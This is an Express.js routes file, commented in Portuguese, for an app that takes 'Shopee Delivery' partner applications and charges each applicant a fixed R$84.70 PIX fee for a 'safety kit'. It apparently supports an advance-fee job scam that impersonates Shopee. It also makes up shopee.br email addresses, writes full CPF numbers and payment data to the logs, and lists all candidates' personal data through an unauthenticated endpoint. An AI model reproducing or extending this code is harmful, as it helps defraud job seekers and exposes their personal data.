import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { paymentService } from "./payment";
import { createFor4Payment } from "./for4payments-bridge";
import { 
  insertCandidateSchema, 
  insertStateSchema, 
  insertBenefitSchema,
  insertUserSchema 
} from "@shared/schema";

// Importar spawn do child_process para executar scripts Python
import { spawn } from 'child_process';

export async function registerRoutes(app: Express): Promise<Server> {
  // Rota de healthcheck
  app.get('/health', (req, res) => {
    res.json({
      status: 'ok',
      env: process.env.NODE_ENV || 'development',
      version: '1.0.0',
      message: 'For4Payments API está operacional',
      timestamp: new Date().toISOString()
    });
  });
  
  // Rota proxy para For4Payments para evitar CORS
  app.post('/api/proxy/for4payments/pix', async (req, res) => {
    try {
      // Verificar se a API For4Payments está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
        return res.status(500).json({
          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
        });
      }
      
      console.log('Iniciando proxy para For4Payments...');
      
      // Configurar cabeçalhos para a requisição à For4Payments
      const apiUrl = 'https://app.for4payments.com.br/api/v1/pix/create';
      const secretKey = process.env.FOR4PAYMENTS_SECRET_KEY;
      
      // Processar os dados recebidos
      const { name, cpf, email, phone, amount = 84.70, description = "Kit de Segurança Shopee Delivery" } = req.body;
      
      if (!name || !cpf) {
        return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
      }
      
      // Construir payload para a For4Payments
      const payload = {
        name,
        document: cpf.replace(/[^0-9]/g, ''),
        email: email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`,
        phone: phone || null,
        amount: amount,
        description
      };
      
      console.log('Enviando requisição para For4Payments API via proxy...', {
        name: payload.name,
        document: payload.document.substring(0, 3) + '***' + payload.document.substring(payload.document.length - 2)
      });
      
      // Enviar requisição para For4Payments
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${secretKey}`,
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      // Processar resposta
      const result = await response.json();
      
      console.log('Resposta da For4Payments recebida pelo proxy');
      
      // Retornar resposta para o cliente
      return res.status(response.status).json(result);
    } catch (error: any) {
      console.error('Erro no proxy For4Payments:', error);
      return res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento pelo proxy'
      });
    }
  });
  // Rota para obter todos os estados
  app.get('/api/states', async (req, res) => {
    try {
      const states = await storage.getAllStates();
      res.json(states);
    } catch (error) {
      console.error('Erro ao buscar estados:', error);
      res.status(500).json({ error: 'Falha ao buscar estados' });
    }
  });

  // Rota para obter estados com vagas disponíveis
  app.get('/api/states/with-vacancies', async (req, res) => {
    try {
      const states = await storage.getStatesWithVacancies();
      res.json(states);
    } catch (error) {
      console.error('Erro ao buscar estados com vagas:', error);
      res.status(500).json({ error: 'Falha ao buscar estados com vagas' });
    }
  });

  // Manter a rota de regiões para retrocompatibilidade
  app.get('/api/regions', async (req, res) => {
    try {
      const states = await storage.getAllStates();
      
      // Mapear o formato antigo, agora usando o vacancyCount
      const regions = states.map(state => ({
        name: state.name,
        abbr: state.code,
        vacancies: state.vacancyCount
      }));
      
      res.json(regions);
    } catch (error) {
      console.error('Erro ao buscar regiões:', error);
      res.status(500).json({ error: 'Falha ao buscar regiões' });
    }
  });

  // Rota para criar ou atualizar um estado
  app.post('/api/states', async (req, res) => {
    try {
      const stateData = insertStateSchema.parse(req.body);
      const state = await storage.createState(stateData);
      res.status(201).json(state);
    } catch (error) {
      console.error('Erro ao criar estado:', error);
      res.status(400).json({ error: 'Dados inválidos para criar estado' });
    }
  });

  // Rota para obter todos os benefícios
  app.get('/api/benefits', async (req, res) => {
    try {
      const benefits = await storage.getAllBenefits();
      res.json(benefits);
    } catch (error) {
      console.error('Erro ao buscar benefícios:', error);
      res.status(500).json({ error: 'Falha ao buscar benefícios' });
    }
  });

  // Rota para criar um benefício
  app.post('/api/benefits', async (req, res) => {
    try {
      const benefitData = insertBenefitSchema.parse(req.body);
      const benefit = await storage.createBenefit(benefitData);
      res.status(201).json(benefit);
    } catch (error) {
      console.error('Erro ao criar benefício:', error);
      res.status(400).json({ error: 'Dados inválidos para criar benefício' });
    }
  });

  // Rota para criar um candidato (delivery partner)
  app.post('/api/candidates', async (req, res) => {
    try {
      const candidateData = insertCandidateSchema.parse(req.body);
      
      // Verificar se o email já está cadastrado
      const existingCandidate = await storage.getCandidateByEmail(candidateData.email);
      if (existingCandidate) {
        return res.status(409).json({ error: 'Email já cadastrado' });
      }
      
      // Verificar se o estado existe
      const state = await storage.getState(candidateData.state);
      if (!state) {
        return res.status(400).json({ error: 'Estado inválido' });
      }
      
      const candidate = await storage.createCandidate(candidateData);
      res.status(201).json(candidate);
    } catch (error) {
      console.error('Erro ao criar candidato:', error);
      res.status(400).json({ error: 'Dados inválidos para criar candidato' });
    }
  });

  // Rota para obter todos os candidatos
  app.get('/api/candidates', async (req, res) => {
    try {
      const candidates = await storage.getAllCandidates();
      res.json(candidates);
    } catch (error) {
      console.error('Erro ao buscar candidatos:', error);
      res.status(500).json({ error: 'Falha ao buscar candidatos' });
    }
  });

  // Rota para processar pagamento PIX (usando TS API For4Payments)
  app.post('/api/payments/pix', async (req, res) => {
    try {
      // Verificar se a API For4Payments está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
        return res.status(500).json({
          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
        });
      }

      console.log('Dados de pagamento recebidos:', req.body);
      
      // Validar dados da requisição
      const { name, email, cpf, phone } = req.body;
      
      // Validação básica
      if (!name) {
        return res.status(400).json({ error: 'Nome é obrigatório.' });
      }
      
      if (!cpf) {
        return res.status(400).json({ error: 'CPF é obrigatório.' });
      }
      
      // Valor fixo para o kit de segurança: R$ 84,70
      const paymentAmount = 84.70;
      
      console.log(`Processando pagamento de R$ ${paymentAmount} para ${name}, CPF ${cpf}`);
      
      // Processar pagamento via For4Payments
      const paymentResult = await paymentService.createPixPayment({
        name,
        email: email || '',
        cpf,
        phone: phone || '',
        amount: paymentAmount
      });
      
      console.log('Resultado do pagamento For4Payments:', paymentResult);
      
      // Retornar resultado para o frontend
      res.status(200).json(paymentResult);
    } catch (error: any) {
      console.error('Erro ao processar pagamento PIX:', error);
      res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento PIX.'
      });
    }
  });
  
  // Rota para processar pagamento PIX
  app.post('/api/payments/pix-python', async (req, res) => {
    try {
      // Validar dados da requisição
      const { nome, email, cpf, telefone } = req.body;
      
      // Validação básica
      if (!nome || !cpf) {
        return res.status(400).json({ 
          error: 'Dados incompletos. Nome e CPF são obrigatórios.' 
        });
      }
      
      // Verificar se a chave secreta está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.error('FOR4PAYMENTS_SECRET_KEY não configurada');
        return res.status(500).json({ 
          error: 'FOR4PAYMENTS_SECRET_KEY não configurada. Configure a chave de API For4Payments.'
        });
      }
      
      console.log('Processando pagamento via API For4Payments...');
      
      // Processar pagamento via API For4Payments 
      // Valor fixo para o kit de segurança: R$ 84,70
      const paymentResult = await paymentService.createPixPayment({
        name: nome,
        email: email || '',
        cpf: cpf,
        phone: telefone || '',
        amount: 84.70
      });
      
      // Retornar resultado para o frontend
      res.status(200).json(paymentResult);
    } catch (error: any) {
      console.error('Erro ao processar pagamento PIX:', error);
      res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento PIX.'
      });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
